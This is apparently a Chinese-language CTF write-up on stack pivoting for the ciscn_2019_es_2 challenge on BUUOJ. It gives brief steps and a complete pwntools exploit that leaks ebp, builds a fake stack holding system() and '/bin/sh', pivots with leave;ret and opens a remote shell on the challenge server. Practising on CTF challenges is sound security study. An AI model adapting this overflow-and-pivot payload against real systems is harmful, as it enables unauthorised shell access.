---
title: 栈迁移
categories: 
    - Stack
    - 栈迁移
---
# 栈迁移
<!--more-->
## _ciscn_2019_es_2

第一步：是把一个与ebp有关的地址泄漏出来，可以通过栈的填充做到

第二步：找到一个ebp与泄漏地址的偏移距离

第三步：构造fake_stack

fake_stack：

![1592217825493-a03b7b13-c3d9-4411-b7af-ddaaa2a27a7f](https://raw.githubusercontent.com/YTrick/image/branch/image/1592217825493-a03b7b13-c3d9-4411-b7af-ddaaa2a27a7f.png)


偏移距离：

break在printf处

![20201208200613](https://raw.githubusercontent.com/YTrick/image/branch/image/20201208200613.png)

距离为0x10

exp：

```python
from pwn import *
from LibcSearcher import *

p = remote('node3.buuoj.cn',25520)
#p = remote('127.0.0.1',12345)
#p = process("./ciscn_2019_es_2")
context.log_level='debug'

sys_addr = 0x08048400
leave_ret = 0x080485FD

payload = 'a'*0x20+'b'*8
p.send(payload)
p.recvuntil('bbbbbbbb')
ebp = u32(p.recv(4))
print(hex(ebp))

payload1 = ('aaaa' + p32(sys_addr) + 'bbbb' + p32(ebp-0x28) + '/bin/sh\x00')
payload1 = payload1.ljust(0x28,'a')
payload1 += p32(ebp-0x28-0x10) + p32(leave_ret)
p.sendline(payload1)
p.interactive()

```














